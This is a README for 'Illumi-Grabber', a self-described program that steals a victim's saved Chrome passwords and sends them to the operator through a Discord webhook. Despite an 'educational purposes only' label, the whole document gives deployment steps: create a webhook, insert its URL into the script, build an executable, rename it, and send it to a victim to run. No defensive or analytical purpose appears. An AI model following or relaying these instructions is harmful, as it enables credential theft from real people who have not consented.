# Illumi-Grabber (educational purposes only)
This is a program i wrote that steals someone's chrome passwords and sends them to you via webhook

# how to use

make a new discord server and make a webhook into it then copy the URL
open asdasdasd.py in visual studio code or any other code editor (DO NOT OPEN IT IN PYTHON OR YOU WILL GRAB YOUR OWN INFO)
scroll to the bottom untill you see the bit that says "WEBHOOK_HERE" and replace that with your webhook URL
save the file and run the builder.bat file to create the payload
once the process is done go into the dist folder where you will find asdasdasd.exe (sometimes hovering over this will freeze file explorer for a bit this is normal)
you can rename it to whatever you like and send to the victim where they will run it and their credentials will be send to you via the webhook you made earlier
